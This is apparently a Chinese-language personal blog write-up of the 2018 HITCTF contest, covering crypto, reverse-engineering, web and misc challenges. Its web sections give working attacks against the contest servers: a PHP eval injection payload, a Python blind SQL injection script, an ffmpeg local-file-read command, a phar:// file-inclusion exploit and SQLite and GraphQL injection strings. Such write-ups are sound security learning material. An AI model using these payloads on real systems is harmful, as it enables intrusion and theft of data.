---
title: 2018 HITCTF WriteUp
tags:
  - CTF
  - WriteUp
date: 2018-02-02 22:34:58
---

刚放假正好看到HITCTF，划了几道水题，WriteUp如下
<!-- more -->

# CRYPTO
### 单表代替 100
用a-z代替各种罗马字符，然后`quipqiup`词频分析，然后找到稍微完整的句子去找到原文，最后替换完整的文章，flag在末尾  
HITCTF{Aft3r_all_t0morrow_1s_anoth3r_day}

# REVERSE
### Baby Android 50
apk名字是xor，用改之理或者apkkill打开apk，反编译后发现两串字符，`异或`一下得到flag

# WEB
### PHPreading
`index.php.bak`泄露了源码
get一个`asdfgjxzkallgj8852`参数，值为`H1TctF2018EzCTF`即可拿到flag

### BabyEval
题目给了源码
```php
<!--
$str=@(string)$_GET['str'];
blackListFilter($black_list, $str);
eval('$str="'.addslashes($str).'";');
-->
```
传入`str={${phpinfo()}}`可以执行，于是构造
![](/img/2018hit1.png)
具体原理可以参考`wooyun-2010-024807`
 

### BabyLeakage
主页提示要进`/news/about/`，进去后提示启用了`debug`，构造`/news/about/1`发现报错，有个`news/auth` 路径很可疑
打开发现报错给了很多东西，有个数据库账号密码，进数据库后把字段拼起来就是flag
![](/img/2018hit2.png)
![](/img/2018hit3.png)

### BabyInjection
题目给了源码
```php
<?php
error_reporting(0);

if (!isset($_POST['username']) || !isset($_POST['passwd'])) {
    echo 'Login and get the flag';
	echo '<form action="" method="post">'."<br/>";
	echo '<input name="username" type="text" placeholder="username"/>'."<br/>";
	echo '<input name="passwd" type="text" placeholder="passwd"/>'."<br/>";
	echo '<input type="submit" ></input>'."<br/>";
	echo '</form>'."<br/>";
    die;
}

$flag = '';
$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)|like|rlike|regexp|limit|or";

$username = $_POST['username'];
$passwd = $_POST['passwd'];
if (preg_match("/".$filter."/is",$username)==1){
    die("Hacker hacker hacker~");
}
if (preg_match("/".$filter."/is",$passwd)==1){
    die("Hacker hacker hacker~");
}

$conn = mysqli_connect();

$query = "SELECT * FROM users WHERE username='{$username}';";
echo $query."<br>";
$query = mysqli_query($conn, $query);
if (mysqli_num_rows($query) == 1){
    $result = mysqli_fetch_array($query);
    if ($result['passwd'] == $passwd){
        die('you did it and this is your flag: '.$flag);
    }
    else{
        die('Wrong password');
    }
}
else{
    die('Wrong username');
}
```
过滤了很多东西，构造盲注拿到密码
```python
#!/usr/bin/env python
# encoding: utf-8
import requests

req=requests.session()
lists="0123456789abcdefghijklmnopqrstuvwxyz"
flag=''

for i in range(50):
    url="http://182.254.247.127:2005/"
    
    ok=''
    for s in lists:
        payload={"username":"1'||passwd<'"+flag+s+"'=id#","passwd":""}
        print payload
        r1=req.post(url,data=payload)

        if "username" in r1.text:
            ok=s
        else:
            flag+=ok
            print flag
            break

        
        #print r1.text
```
![](/img/2018hit14.png)
然后用密码去拿flag
```php
if ($result['passwd'] == $passwd){
  die('you did it and this is your flag: '.$flag);
}
```
![](/img/2018hit5.png)

### 小电影 200
Ffmpeg读文件
```
python3 ffmpeg.py file:///flag.txt sxcurity.avi
```
![](/img/2018hit6.png)

### SecurePY
参考chybeta 
https://chybeta.github.io/2017/09/05/TWCTF-2017-Super-Secure-Storage-writeup/
`__pycache__/app.cpython-35.pyc` 读取缓存，反编译得到源码
然后爆破key
![](/img/2018hit7.png)
得到key，解密得到flag
![](/img/2018hit8.png)

### BabyWrite
这题存在文件包含，可以用伪协议读取所有源码，然后发现可以写文件的地方
但是写入的文件大概是这样的
```
$username+" => "+$password
```
并且文件后缀为`log`，而文件包含的部分限定了后缀为`.php`,尝试`%00`失败，包含远程文件失败，  
那就只剩`phar://`和`zip://`了，这里就只剩一个问题了，`=>`该怎么绕过，
这里卡了很久，以前看过一航大佬的文章我竟然给忘了，后来给了hint去看了才知道  
https://www.jianshu.com/p/03e612b9e379
知道怎么绕过后就很简单了
构造一个含有`=>`字符串的phar包，
```php
<?php  
$phar = new Phar('test.phar', 0, 'test.phar');  
$phar->buildFromDirectory(dirname(__FILE__) . '/project');  
$phar->setDefaultStub('1 => 1.php', '1 => 1.php');  
$phar->compressFiles(Phar::GZ);
```
然后把`=>`前面的作为username，后面的作为password写入log文件夹
![](/img/2018hit9.png)
![](/img/2018hit10.png)
最后`?page=phar://log/xxxx/test`包含执行命令读取flag
 
### BabyQuery
先上参考文章
https://klionsec.github.io/2016/05/18/sqlite3-common-injection/
http://www.au1ge.xyz/2017/08/28/hitb-ctf-singapore-2017-web-wp/
http://godot.win/index.php/archives/16/

看到题目只有一个按钮，点击，抓包，可以看到发送了一个query参数，用的是graphql ，传递的东西里有个Base32的字符串，解密得到1，尝试发送加引号的Base32字符串，提示只接受一个长度的字符串，于是各种搜索引擎，查到可以列出所有方法名的语句，
```
query={ __schema{queryType{fields{ name description}}} }
 ```
![](/img/2018hit11.png)
得到另一个方法`getscorebyyourname`，这个方法可以传递一个`name`字段，存在sql注入，然后就是查询`sqlit3`的注入技巧了，最后构造的注入语句
```
111' union select flag from Secr3t_fl4g --+"
```
![](/img/2018hit12.png)

# MISC
### 签到
爬墙去youtube看视频拿flag

### BaSO4
反编译pyc得到源码，随机加密base64或base32，一共20次，
可以写脚本判断是否有小写字母来区分base64还是base32，因为加密次数不算很多，我是直接肉眼识别手动解密

### 攻击流量分析
查看流量发现最后有个加密读取flag.txt的，导出到本地反向解密即可得到flag

### 键盘流量分析
```
tshark.exe -r keyboard.pcap -T fields -e usb.capdata > usbdata.txt
```
导出键盘数据，脚本解密得到flag，要注意的是需要判断shift状态来区分大小写
```python
mappings = { 0x04:"A",  0x05:"B",  0x06:"C", 0x07:"D", 0x08:"E", 0x09:"F", 0x0A:"G",  0x0B:"H", 0x0C:"I",  0x0D:"J", 0x0E:"K", 0x0F:"L", 0x10:"M", 0x11:"N",0x12:"O",  0x13:"P", 0x14:"Q", 0x15:"R", 0x16:"S", 0x17:"T", 0x18:"U",0x19:"V", 0x1A:"W", 0x1B:"X", 0x1C:"Y", 0x1D:"Z", 0x1E:"1", 0x1F:"2", 0x20:"3", 0x21:"4", 0x22:"5",  0x23:"6", 0x24:"7", 0x25:"8", 0x26:"9", 0x27:"0", 0x28:"n", 0x2a:"[DEL]",  0X2B:"    ", 0x2C:" ",  0x2D:"-", 0x2E:"=", 0x2F:"[",  0x30:"]",  0x31:"\\", 0x32:"~", 0x33:";",  0x34:"'", 0x36:",",  0x37:"." }
nums = []
keys = open('usbdata.txt')
for line in keys:
    if line[0]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' :
         continue
    print mappings[int(line[6:8],16)],line
    nums.append(int(line[6:8],16))
    #print nums
keys.close()
output = ""
i=0
for n in nums:
    i+=1
    
    if n == 0 :
        continue
    print i,output,mappings[n]
    if n in mappings:
        output += mappings[n]
    else:
        output += '[unknown]'
    
print 'output :n' + output
```
![](/img/2018hit13.png)
02开头的为按住shift状态

